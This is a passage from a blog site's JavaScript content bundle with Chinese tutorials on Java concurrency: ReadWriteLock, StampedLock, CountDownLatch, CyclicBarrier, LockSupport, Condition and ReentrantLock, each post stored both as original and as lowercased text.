= readwritelock.readlock();//\n    private final lock writelock = readwritelock.writelock();\n    private int count = 0;\n    \n    public void add(){\n        writelock.lock();//加写锁\n        count = count +1;\n        writelock.unlock();//解写锁\n    }\n    \n    private int getcount(){\n        readlock.lock();//加读锁\n        int returncount = count;\n        readlock.unlock();//解读锁\n        return returncount;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n那么问题来了，既然希望读能够并发，为什么对于读还需要加锁呢？\n\n这是为了让读和写不能并行，如果读不加锁，写的时候就不会在检测时候检测到没有读锁，从而获取完写锁直接就进行修改，导致了读和写同时进入临界区\n\n\n# stampedlock\n\nstampedlock和readwritelock相比，改进之处在于：读的过程中也允许获取写锁后写入！这样一来，我们读的数据就可能不一致，所以，需要一点额外的代码来判断读的过程中是否有写入，这种读锁是一种乐观锁。\n\n//摘自廖雪峰老师java课程的代码\npublic class point {\n    private final stampedlock stampedlock = new stampedlock();\n\n    private double x;\n    private double y;\n\n    public void move(double deltax, double deltay) {\n        long stamp = stampedlock.writelock(); // 获取写锁\n        try {\n            x += deltax;\n            y += deltay;\n        } finally {\n            stampedlock.unlockwrite(stamp); // 释放写锁\n        }\n    }\n\n    public double distancefromorigin() {\n        long stamp = stampedlock.tryoptimisticread(); // 获得一个乐观读锁\n        // 注意下面两行代码不是原子操作\n        // 假设x,y = (100,200)\n        double currentx = x;\n        // 此处已读取到x=100，但x,y可能被写线程修改为(300,400)\n        double currenty = y;\n        // 此处已读取到y，如果没有写入，读取是正确的(100,200)\n        // 如果有写入，读取是错误的(100,400)\n        if (!stampedlock.validate(stamp)) { // 检查乐观读锁后是否有其他写锁发生\n            stamp = stampedlock.readlock(); // 获取一个悲观读锁\n            try {\n                currentx = x;\n                currenty = y;\n            } finally {\n                stampedlock.unlockread(stamp); // 释放悲观读锁\n            }\n        }\n        return math.sqrt(currentx * currentx + currenty * currenty);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"Java多线程让主线程等待子线程结束",frontmatter:{title:"Java多线程让主线程等待子线程结束",date:"2022-04-17T23:33:06.000Z",permalink:"/pages/3bc47f/",categories:["java","多线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/03.%E5%A4%9A%E7%BA%BF%E7%A8%8B/06.Java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%A9%E4%B8%BB%E7%BA%BF%E7%A8%8B%E7%AD%89%E5%BE%85%E5%AD%90%E7%BA%BF%E7%A8%8B%E7%BB%93%E6%9D%9F.html",relativePath:"04.java/03.多线程/06.Java多线程让主线程等待子线程结束.md",key:"v-555f1af9",path:"/pages/3bc47f/",headers:[{level:2,title:"Thread的join()方法",slug:"thread的join-方法",normalizedTitle:"thread的join()方法",charIndex:2},{level:2,title:"CountDownLatch",slug:"countdownlatch",normalizedTitle:"countdownlatch",charIndex:459},{level:2,title:"Future",slug:"future",normalizedTitle:"future",charIndex:1461},{level:2,title:"BlockingQueue",slug:"blockingqueue",normalizedTitle:"blockingqueue",charIndex:2890},{level:2,title:"CyclicBarrier",slug:"cyclicbarrier",normalizedTitle:"cyclicbarrier",charIndex:3831},{level:2,title:"LockSupport",slug:"locksupport",normalizedTitle:"locksupport",charIndex:4996}],headersStr:"Thread的join()方法 CountDownLatch Future BlockingQueue CyclicBarrier LockSupport",content:'# Thread的join()方法\n\nlong start = System.currentTimeMillis();\nSystem.out.println("start = " + start);\nt1.start();\ntry {\n    t.join();//注意这里\n} catch (InterruptedException e) {\n    e.printStackTrace();\n}\nlong end = System.currentTimeMillis();\nSystem.out.println("end = " + end);\nSystem.out.println("end - Start:" + (end - start));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n使用join()方法，join()方法的作用，是等待这个线程结束；（t.join()方法阻塞调用此方法的线程(calling thread)，直到线程t完成，此线程再继续，这里贴个说的挺清楚的博客）\n\n\n# CountDownLatch\n\n第四种方式可以等待多个线程结束，就是使用java.util.concurrent包下的CountDownLatch类（关于CountDownLatch的用法可以参考这篇简洁的博客） 简单来说，CountDownLatch类是一个计数器，可以设置初始线程数（设置后不能改变），在子线程结束时调用countDown()方法可以使线程数减一，最终为0的时候，调用CountDownLatch的成员方法wait()的线程就会取消BLOKED阻塞状态，进入RUNNABLE从而继续执行。下面上代码：\n\nint threadNumber = 1;\nfinal CountDownLatch cdl = new CountDownLatch(threadNumber);//参数为线程个数\n\nThread t = new Thread(() -> {\n    int num = 1000;\n    String s = "";\n    for (int i = 0; i < num; i++) {\n        s += "Java";\n    }\n    System.out.println("t Over");\n    cdl.countDown();//此方法是CountDownLatch的线程数-1\n});\n\nlong start = System.currentTimeMillis();\nSystem.out.println("start = " + start);\nt.start();\n//线程启动后调用countDownLatch方法\ntry {\n    cdl.await();//需要捕获异常，当其中线程数为0时这里才会继续运行\n}catch (InterruptedException e){\n    e.printStackTrace();\n}\nlong end = System.currentTimeMillis();\nSystem.out.println("end = " + end);\nSystem.out.println("end - start = " + (end - start));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# Future\n\n又想到刚学习了线程池，线程池的submit()的返回对象Future接口有一个get()方法也可以阻塞当前线程（其实该方法主要用途是获取子线程的返回值）\n\nExecutorService executorService = Executors.newFixedThreadPool(1);\n\nThread t = new Thread(() -> {\n    int num = 1000;\n    String s = "";\n    for (int i = 0; i < num; i++) {\n        s += "Java";\n    }\n    System.out.println("t Over");\n});\nlong start = System.currentTimeMillis();\nSystem.out.println("start = " + start);\nFuture future = executorService.submit(t);//子线程启动\ntry {\n    future.get();//需要捕获两种异常\n}catch (InterruptedException e){\n    e.printStackTrace();\n}catch (ExecutionException e){\n    e.printStackTrace();\n}\nlong end = System.currentTimeMillis();\nSystem.out.println("end = " + end);\nSystem.out.println("end - start = " + (end - start));\nexecutorService.shutdown();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n> 这里, ThreadPoolExecutor 是实现了 ExecutorService的方法, sumbit的过程就是把一个Runnable接口对象包装成一个 Callable接口对象, 然后放到 workQueue里等待调度执行. 当然, 执行的启动也是调用了thread的start来做到的, 只不过这里被包装掉了. 另外, 这里的thread是会被重复利用的, 所以这里要退出主线程, 需要执行以下shutdown方法以示退出使用线程池. 扯远了. 这种方法是得益于Callable接口和Future模式, 调用future接口的get方法, 会同步等待该future执行结束, 然后获取到结果. Callbale接口的接口方法是 V call(); 是可以有返回结果的, 而Runnable的 void run(), 是没有返回结果的. 所以, 这里即使被包装成Callbale接口, future.get返回的结果也是null的.如果需要得到返回结果, 建议使用Callable接口.\n> \n> 参见这篇博客\n\n看到这个Callable突然想到之前看C#多线程的时候有说到回调的问题，因此先开个坑，下篇博文说说Java的Callable与callback问题，先贴个Callable的简单讲解\n\n----------------------------------------\n\n\n# BlockingQueue\n\n同时，在concurrent包中，还提供了BlockingQueue（队列）来操作线程，BlockingQueue的主要的用法是在线程间安全有效的传递数据，具体用法可以参见这篇博客，对于BlockingQueue说的非常详细。\n\nBlockingQueue queue = new ArrayBlockingQueue(1);//数组型队列，长度为1\nThread t = new Thread(() -> {\n    int num = 1000;\n    String s = "";\n    for (int i = 0; i < num; i++) {\n        s += "Java";\n    }\n    System.out.println("t Over");\n    try {\n        queue.put("OK");//在队列中加入数据\n    } catch (InterruptedException e) {\n        e.printStackTrace();\n    }\n});\nlong start = System.currentTimeMillis();\nSystem.out.println("start = " + start);\nt.start();\ntry {\n    queue.take();//主线程在队列中获取数据，take()方法会阻塞队列，ps还有不会阻塞的方法\n} catch (InterruptedException e) {\n    e.printStackTrace();\n}\nlong end = System.currentTimeMillis();\nSystem.out.println("end = " + end);\nSystem.out.println("end - start = " + (end - start));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n----------------------------------------\n\n\n# CyclicBarrier\n\n> CyclicBarrier字面意思回环栅栏，通过它可以实现让一组线程等待至某个状态之后再全部同时执行。叫做回环是因为当所有等待线程都被释放以后，CyclicBarrier可以被重用。\n\nCyclicBarrier barrier = new CyclicBarrier(2);//参数为线程数\nThread t = new Thread(() -> {\n    int num = 1000;\n    String s = "";\n    for (int i = 0; i < num; i++) {\n        s += "Java";\n    }\n    System.out.println("t Over");\n    try {\n        barrier.await();//阻塞\n    } catch (InterruptedException e) {\n        e.printStackTrace();\n    } catch (BrokenBarrierException e) {\n        e.printStackTrace();\n    }\n});\nlong start = System.currentTimeMillis();\nSystem.out.println("start = " + start);\nt.start();\ntry {\n    barrier.await();//也阻塞,并且当阻塞数量达到指定数目时同时释放\n} catch (InterruptedException e) {\n    e.printStackTrace();\n} catch (BrokenBarrierException e) {\n    e.printStackTrace();\n}\nlong end = System.currentTimeMillis();\nSystem.out.println("end = " + end);\nSystem.out.println("end - start = " + (end - start));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n实际是上面这种方法是不太严谨的，因为在子线程阻塞之后如果还有代码是会继续执行的，当然本例中后面是没有代码可执行了，可以近似理解为是子线程的运行时间。\n\n这里贴个CountDownLatch、CyclicBarrier和Semaphore的讲解博客\n\n----------------------------------------\n\n\n# LockSupport\n\nThread mainThread = Thread.currentThread();\nThread t = new Thread(() -> {\n    //子线程进行字符串连接操作\n    int num = 1000;\n    String s = "";\n    for (int i = 0; i < num; i++) {\n        s += "Java";\n    }\n    System.out.println("t Over");\n    LockSupport.unpark(mainThread);\n});\n//开始计时\nlong start = System.currentTimeMillis();\nSystem.out.println("start = " + start);\nt.start();\nLockSupport.park();// 相当于暂停主线程\nlong end = System.currentTimeMillis();\nSystem.out.println("end = " + end);\nSystem.out.println("end - start = " + (end - start));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n简单来说就是LockSupport.unpark(mainThread)方法会给mainThread方法发一张允许执行的许可，而LockSupport.park()方法会消耗掉许可，如果没有票就阻塞当前线程。（“许可”是不能叠加的，“许可”是一次性的）\n\n----------------------------------------',normalizedContent:'# thread的join()方法\n\nlong start = system.currenttimemillis();\nsystem.out.println("start = " + start);\nt1.start();\ntry {\n    t.join();//注意这里\n} catch (interruptedexception e) {\n    e.printstacktrace();\n}\nlong end = system.currenttimemillis();\nsystem.out.println("end = " + end);\nsystem.out.println("end - start:" + (end - start));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n使用join()方法，join()方法的作用，是等待这个线程结束；（t.join()方法阻塞调用此方法的线程(calling thread)，直到线程t完成，此线程再继续，这里贴个说的挺清楚的博客）\n\n\n# countdownlatch\n\n第四种方式可以等待多个线程结束，就是使用java.util.concurrent包下的countdownlatch类（关于countdownlatch的用法可以参考这篇简洁的博客） 简单来说，countdownlatch类是一个计数器，可以设置初始线程数（设置后不能改变），在子线程结束时调用countdown()方法可以使线程数减一，最终为0的时候，调用countdownlatch的成员方法wait()的线程就会取消bloked阻塞状态，进入runnable从而继续执行。下面上代码：\n\nint threadnumber = 1;\nfinal countdownlatch cdl = new countdownlatch(threadnumber);//参数为线程个数\n\nthread t = new thread(() -> {\n    int num = 1000;\n    string s = "";\n    for (int i = 0; i < num; i++) {\n        s += "java";\n    }\n    system.out.println("t over");\n    cdl.countdown();//此方法是countdownlatch的线程数-1\n});\n\nlong start = system.currenttimemillis();\nsystem.out.println("start = " + start);\nt.start();\n//线程启动后调用countdownlatch方法\ntry {\n    cdl.await();//需要捕获异常，当其中线程数为0时这里才会继续运行\n}catch (interruptedexception e){\n    e.printstacktrace();\n}\nlong end = system.currenttimemillis();\nsystem.out.println("end = " + end);\nsystem.out.println("end - start = " + (end - start));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# future\n\n又想到刚学习了线程池，线程池的submit()的返回对象future接口有一个get()方法也可以阻塞当前线程（其实该方法主要用途是获取子线程的返回值）\n\nexecutorservice executorservice = executors.newfixedthreadpool(1);\n\nthread t = new thread(() -> {\n    int num = 1000;\n    string s = "";\n    for (int i = 0; i < num; i++) {\n        s += "java";\n    }\n    system.out.println("t over");\n});\nlong start = system.currenttimemillis();\nsystem.out.println("start = " + start);\nfuture future = executorservice.submit(t);//子线程启动\ntry {\n    future.get();//需要捕获两种异常\n}catch (interruptedexception e){\n    e.printstacktrace();\n}catch (executionexception e){\n    e.printstacktrace();\n}\nlong end = system.currenttimemillis();\nsystem.out.println("end = " + end);\nsystem.out.println("end - start = " + (end - start));\nexecutorservice.shutdown();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n> 这里, threadpoolexecutor 是实现了 executorservice的方法, sumbit的过程就是把一个runnable接口对象包装成一个 callable接口对象, 然后放到 workqueue里等待调度执行. 当然, 执行的启动也是调用了thread的start来做到的, 只不过这里被包装掉了. 另外, 这里的thread是会被重复利用的, 所以这里要退出主线程, 需要执行以下shutdown方法以示退出使用线程池. 扯远了. 这种方法是得益于callable接口和future模式, 调用future接口的get方法, 会同步等待该future执行结束, 然后获取到结果. callbale接口的接口方法是 v call(); 是可以有返回结果的, 而runnable的 void run(), 是没有返回结果的. 所以, 这里即使被包装成callbale接口, future.get返回的结果也是null的.如果需要得到返回结果, 建议使用callable接口.\n> \n> 参见这篇博客\n\n看到这个callable突然想到之前看c#多线程的时候有说到回调的问题，因此先开个坑，下篇博文说说java的callable与callback问题，先贴个callable的简单讲解\n\n----------------------------------------\n\n\n# blockingqueue\n\n同时，在concurrent包中，还提供了blockingqueue（队列）来操作线程，blockingqueue的主要的用法是在线程间安全有效的传递数据，具体用法可以参见这篇博客，对于blockingqueue说的非常详细。\n\nblockingqueue queue = new arrayblockingqueue(1);//数组型队列，长度为1\nthread t = new thread(() -> {\n    int num = 1000;\n    string s = "";\n    for (int i = 0; i < num; i++) {\n        s += "java";\n    }\n    system.out.println("t over");\n    try {\n        queue.put("ok");//在队列中加入数据\n    } catch (interruptedexception e) {\n        e.printstacktrace();\n    }\n});\nlong start = system.currenttimemillis();\nsystem.out.println("start = " + start);\nt.start();\ntry {\n    queue.take();//主线程在队列中获取数据，take()方法会阻塞队列，ps还有不会阻塞的方法\n} catch (interruptedexception e) {\n    e.printstacktrace();\n}\nlong end = system.currenttimemillis();\nsystem.out.println("end = " + end);\nsystem.out.println("end - start = " + (end - start));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n----------------------------------------\n\n\n# cyclicbarrier\n\n> cyclicbarrier字面意思回环栅栏，通过它可以实现让一组线程等待至某个状态之后再全部同时执行。叫做回环是因为当所有等待线程都被释放以后，cyclicbarrier可以被重用。\n\ncyclicbarrier barrier = new cyclicbarrier(2);//参数为线程数\nthread t = new thread(() -> {\n    int num = 1000;\n    string s = "";\n    for (int i = 0; i < num; i++) {\n        s += "java";\n    }\n    system.out.println("t over");\n    try {\n        barrier.await();//阻塞\n    } catch (interruptedexception e) {\n        e.printstacktrace();\n    } catch (brokenbarrierexception e) {\n        e.printstacktrace();\n    }\n});\nlong start = system.currenttimemillis();\nsystem.out.println("start = " + start);\nt.start();\ntry {\n    barrier.await();//也阻塞,并且当阻塞数量达到指定数目时同时释放\n} catch (interruptedexception e) {\n    e.printstacktrace();\n} catch (brokenbarrierexception e) {\n    e.printstacktrace();\n}\nlong end = system.currenttimemillis();\nsystem.out.println("end = " + end);\nsystem.out.println("end - start = " + (end - start));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n实际是上面这种方法是不太严谨的，因为在子线程阻塞之后如果还有代码是会继续执行的，当然本例中后面是没有代码可执行了，可以近似理解为是子线程的运行时间。\n\n这里贴个countdownlatch、cyclicbarrier和semaphore的讲解博客\n\n----------------------------------------\n\n\n# locksupport\n\nthread mainthread = thread.currentthread();\nthread t = new thread(() -> {\n    //子线程进行字符串连接操作\n    int num = 1000;\n    string s = "";\n    for (int i = 0; i < num; i++) {\n        s += "java";\n    }\n    system.out.println("t over");\n    locksupport.unpark(mainthread);\n});\n//开始计时\nlong start = system.currenttimemillis();\nsystem.out.println("start = " + start);\nt.start();\nlocksupport.park();// 相当于暂停主线程\nlong end = system.currenttimemillis();\nsystem.out.println("end = " + end);\nsystem.out.println("end - start = " + (end - start));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n简单来说就是locksupport.unpark(mainthread)方法会给mainthread方法发一张允许执行的许可，而locksupport.park()方法会消耗掉许可，如果没有票就阻塞当前线程。（“许可”是不能叠加的，“许可”是一次性的）\n\n----------------------------------------',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"使用 Condition, wait 和 notify 的替代品",frontmatter:{title:"使用 Condition, wait 和 notify 的替代品",date:"2022-04-17T23:33:06.000Z",permalink:"/pages/a5c115/",categories:["java","多线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/03.%E5%A4%9A%E7%BA%BF%E7%A8%8B/09.%E4%BD%BF%E7%94%A8%20Condition,%20wait%20%E5%92%8C%20notify%20%E7%9A%84%E6%9B%BF%E4%BB%A3%E5%93%81.html",relativePath:"04.java/03.多线程/09.使用 Condition, wait 和 notify 的替代品.md",key:"v-8cd8bc44",path:"/pages/a5c115/",headers:[{level:4,title:"小结",slug:"小结",normalizedTitle:"小结",charIndex:1486}],headersStr:"小结",content:"使用ReentrantLock比直接使用synchronized更安全，可以替代synchronized进行线程同步。\n\n但是，synchronized可以配合wait和notify实现线程在条件不满足时等待，条件满足时唤醒，用ReentrantLock我们怎么编写wait和notify的功能呢？\n\n答案是使用Condition对象来实现wait和notify的功能。\n\n我们仍然以TaskQueue为例，把前面用synchronized实现的功能通过ReentrantLock和Condition来实现：\n\nclass TaskQueue {\n    private final Lock lock = new ReentrantLock();\n    private final Condition condition = lock.newCondition();\n    private Queue<String> queue = new LinkedList<>();\n\n    public void addTask(String s) {\n        lock.lock();\n        try {\n            queue.add(s);\n            condition.signalAll();\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public String getTask() {\n        lock.lock();\n        try {\n            while (queue.isEmpty()) {\n                condition.await();\n            }\n            return queue.remove();\n        } finally {\n            lock.unlock();\n        }\n    }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n可见，使用Condition时，引用的Condition对象必须从Lock实例的newCondition()返回，这样才能获得一个绑定了Lock实例的Condition实例。\n\nCondition提供的await()、signal()、signalAll()原理和synchronized锁对象的wait()、notify()、notifyAll()是一致的，并且其行为也是一样的：\n\n * await()会释放当前锁，进入等待状态；\n\n * signal()会唤醒某个等待线程；\n\n * signalAll()会唤醒所有等待线程；\n\n * 唤醒线程从await()返回后需要重新获得锁。\n\n此外，和tryLock()类似，await()可以在等待指定时间后，如果还没有被其他线程通过signal()或signalAll()唤醒，可以自己醒来：\n\nif (condition.await(1, TimeUnit.SECOND)) {\n    // 被其他线程唤醒\n} else {\n    // 指定时间内没有被其他线程唤醒\n} \n\n\n1\n2\n3\n4\n5\n\n\n可见，使用Condition配合Lock，我们可以实现更灵活的线程同步。\n\n# 小结\n\nCondition可以替代wait和notify；\n\nCondition对象必须从Lock对象获取。",normalizedContent:"使用reentrantlock比直接使用synchronized更安全，可以替代synchronized进行线程同步。\n\n但是，synchronized可以配合wait和notify实现线程在条件不满足时等待，条件满足时唤醒，用reentrantlock我们怎么编写wait和notify的功能呢？\n\n答案是使用condition对象来实现wait和notify的功能。\n\n我们仍然以taskqueue为例，把前面用synchronized实现的功能通过reentrantlock和condition来实现：\n\nclass taskqueue {\n    private final lock lock = new reentrantlock();\n    private final condition condition = lock.newcondition();\n    private queue<string> queue = new linkedlist<>();\n\n    public void addtask(string s) {\n        lock.lock();\n        try {\n            queue.add(s);\n            condition.signalall();\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public string gettask() {\n        lock.lock();\n        try {\n            while (queue.isempty()) {\n                condition.await();\n            }\n            return queue.remove();\n        } finally {\n            lock.unlock();\n        }\n    }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n可见，使用condition时，引用的condition对象必须从lock实例的newcondition()返回，这样才能获得一个绑定了lock实例的condition实例。\n\ncondition提供的await()、signal()、signalall()原理和synchronized锁对象的wait()、notify()、notifyall()是一致的，并且其行为也是一样的：\n\n * await()会释放当前锁，进入等待状态；\n\n * signal()会唤醒某个等待线程；\n\n * signalall()会唤醒所有等待线程；\n\n * 唤醒线程从await()返回后需要重新获得锁。\n\n此外，和trylock()类似，await()可以在等待指定时间后，如果还没有被其他线程通过signal()或signalall()唤醒，可以自己醒来：\n\nif (condition.await(1, timeunit.second)) {\n    // 被其他线程唤醒\n} else {\n    // 指定时间内没有被其他线程唤醒\n} \n\n\n1\n2\n3\n4\n5\n\n\n可见，使用condition配合lock，我们可以实现更灵活的线程同步。\n\n# 小结\n\ncondition可以替代wait和notify；\n\ncondition对象必须从lock对象获取。",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"一文彻底理解ReentrantLock可重入锁的使用",frontmatter:{title:"一文彻底理解ReentrantLock可重入锁的使用",date:"2022-04-17T23:33:06.000Z",permalink:"/pages/062012/",categories:["java","多线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/03.%E5%A4%9A%E7%BA%BF%E7%A8%8B/10.%E4%B8%80%E6%96%87%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3ReentrantLock%E5%8F%AF%E9%87%8D%E5%85%A5%E9%94%81%E7%9A%84%E4%BD%BF%E7%94%A8.html",relativePath:"04.java/03.多线程/10.一文彻底理解ReentrantLock可重入锁的使用.md",key:"v-51ef40e8",path:"/pages/062012/",headersStr:null,content:"java除了使用关键字synchronized外，还可以使用ReentrantLock实现独占锁的功能。而且ReentrantLock相比synchronized而言功能更加丰富，使用起来更为灵活，也更适合复杂的并发场景。这篇文章主要是从使用的角度来分析一下ReentrantLock。\n\n一、简介\n\nReentrantLock常常对比着synchronized来分析，我们先对比着来看然后再一点一点分析。\n\n（1）synchronized是独占锁，加锁和解锁的过程自动进行，易于操作，但不够灵活。ReentrantLock也是独占锁，加锁和解锁的过程需要手动进行，不易操作，但非常灵活。\n\n（2）synchronized可重入，因为加锁和解锁自动进行，不必担心最后是否释放锁；ReentrantLock也可重入，但加锁和解锁需要手动进行，且次数需一样，否则其他线程无法获得锁。\n\n（3）synchronized不可响应中断，一个线程获取不到锁就一直等着；ReentrantLock可以相应中断。\n\nReentrantLock好像比synchronized关键字没好太多，我们再去看看synchronized所没有的，一个最主要的就是ReentrantLock还可以实现公平锁机制。什么叫公平锁呢？也就是在锁上等待时间最长的线程将获得锁的使用权。通俗的理解就是谁排队时间最长谁先执行获取锁。\n\n字数写得多可能大家都会烦，干脆直接上代码演示。\n\n二、使用\n\n1、简单使用\n\n我们先给出一个最基础的使用案例，也就是实现锁的功能。\n\n\n\n在这里我们定义了一个ReentrantLock，然后再test方法中分别lock和unlock，运行一边就可以实现我们的功能。这就是最简单的功能实现，代码很简单。我们再看看ReentrantLock和synchronized不一样的地方，那就是公平锁的实现。\n\n2、公平锁实现\n\n对于公平锁的实现，就要结合着我们的可重入性质了。公平锁的含义我们上面已经说了，就是谁等的时间最长，谁就先获取锁。\n\n\n\n首先new一个ReentrantLock的时候参数为true，表明实现公平锁机制。在这里我们多定义几个线程ABCDE，然后再test方法中循环执行了两次加锁和解锁的过程。\n\n\n\n3、非公平锁实现\n\n非公平锁那就随机的获取，谁运气好，cpu时间片轮到哪个线程，哪个线程就能获取锁，和上面公平锁的区别很简单，就在于先new一个ReentrantLock的时候参数为false，当然我们也可以不写，默认就是false。直接测试一下\n\n\n\n4、响应中断\n\n响应中断就是一个线程获取不到锁，不会傻傻的一直等下去，ReentrantLock会给予一个中断回应。在这里我们举一个死锁的案例。\n\n首先我们定义一个测试类ReentrantLockTest3。\n\n\n\n在这里我们定义了两个锁lock1和lock2。然后使用两个线程thread和thread1构造死锁场景。正常情况下，这两个线程相互等待获取资源而处于死循环状态。但是我们此时thread中断，另外一个线程就可以获取资源，正常地执行了。\n\n\n\n我们运行测试一下：\n\n\n\n5、限时等待\n\n这个是什么意思呢？也就是通过我们的tryLock方法来实现，可以选择传入时间参数，表示等待指定的时间，无参则表示立即返回锁申请的结果：true表示获取锁成功，false表示获取锁失败。我们可以将这种方法用来解决死锁问题。\n\n首先还是测试代码，不过在这里我们不需要再去中断其中的线程了，我们直接看线程类是如何实现的。\n\n\n\n在这个案例中，一个线程获取lock1时候第一次失败，那就等10毫秒之后第二次获取，就这样一直不停的调试，一直等到获取到相应的资源为止。\n\n当然，我们可以设置tryLock的超时等待时间tryLock(long timeout,TimeUnit unit)，也就是说一个线程在指定的时间内没有获取锁，那就会返回false，就可以再去做其他事了。",normalizedContent:"java除了使用关键字synchronized外，还可以使用reentrantlock实现独占锁的功能。而且reentrantlock相比synchronized而言功能更加丰富，使用起来更为灵活，也更适合复杂的并发场景。这篇文章主要是从使用的角度来分析一下reentrantlock。\n\n一、简介\n\nreentrantlock常常对比着synchronized来分析，我们先对比着来看然后再一点一点分析。\n\n（1）synchronized是独占锁，加锁和解锁的过程自动进行，易于操作，但不够灵活。reentrantlock也是独占锁，加锁和解锁的过程需要手动进行，不易操作，但非常灵活。\n\n（2）synchronized可重入，因为加锁和解锁自动进行，不必担心最后是否释放锁；reentrantlock也可重入，但加锁和解锁需要手动进行，且次数需一样，否则其他线程无法获得锁。\n\n（3）synchronized不可响应中断，一个线程获取不到锁就一直等着；reentrantlock可以相应中断。\n\nreentrantlock好像比synchronized关键字没好太多，我们再去看看synchronized所没有的，一个最主要的就是reentrantlock还可以实现公平锁机制。什么叫公平锁呢？也就是在锁上等待时间最长的线程将获得锁的使用权。通俗的理解就是谁排队时间最长谁先执行获取锁。\n\n字数写得多可能大家都会烦，干脆直接上代码演示。\n\n二、使用\n\n1、简单使用\n\n我们先给出一个最基础的使用案例，也就是实现锁的功能。\n\n\n\n在这里我们定义了一个reentrantlock，然后再test方法中分别lock和unlock，运行一边就可以实现我们的功能。这就是最简单的功能实现，代码很简单。我们再看看reentrantlock和synchronized不一样的地方，那就是公平锁的实现。\n\n2、公平锁实现\n\n对于公平锁的实现，就要结合着我们的可重入性质了。公平锁的含义我们上面已经说了，就是谁等的时间最长，谁就先获取锁。\n\n\n\n首先new一个reentrantlock的时候参数为true，表明实现公平锁机制。在这里我们多定义几个线程abcde，然后再test方法中循环执行了两次加锁和解锁的过程。\n\n\n\n3、非公平锁实现\n\n非公平锁那就随机的获取，谁运气好，cpu时间片轮到哪个线程，哪个线程就能获取锁，和上面公平锁的区别很简单，就在于先new一个reentrantlock的时候参数为false，当然我们也可以不写，默认就是false。直接测试一下\n\n\n\n4、响应中断\n\n响应中断就是一个线程获取不到锁，不会傻傻的一直等下去，reentrantlock会给予一个中断回应。在这里我们举一个死锁的案例。\n\n首先我们定义一个测试类reentrantlocktest3。\n\n\n\n在这里我们定义了两个锁lock1和lock2。然后使用两个线程thread和thread1构造死锁场景。正常情况下，这两个线程相互等待获取资源而处于死循环状态。但是我们此时thread中断，另外一个线程就可以获取资源，正常地执行了。\n\n\n\n我们运行测试一下：\n\n\n\n5、限时等待\n\n这个是什么意思呢？也就是通过我们的trylock方法来实现，可以选择传入时间参数，表示等待指定的时间，无参则表示立即返回锁申请的结果：true表示获取锁成功，false表示获取锁失败。我们可以将这种方法用来解决死锁问题。\n\n首先还是测试代码，不过在这里我们不需要再去中断其中的线程了，我们直接看线程类是如何实现的。\n\n\n\n在这个案例中，一个线程获取lock1时候第一次失败，那就等10毫秒之后第二次获取，就这样一直不停的调试，一直等到获取到相应的资源为止。\n\n当然，我们可以设置trylock的超时等待时间trylock(long timeout,timeunit unit)，也就是说一个线程在指定的时间内没有获取锁，那就会返回false，就可以再去做其他事了。",charsets:{cjk:!0},lastUpdated:"2022/04/18, 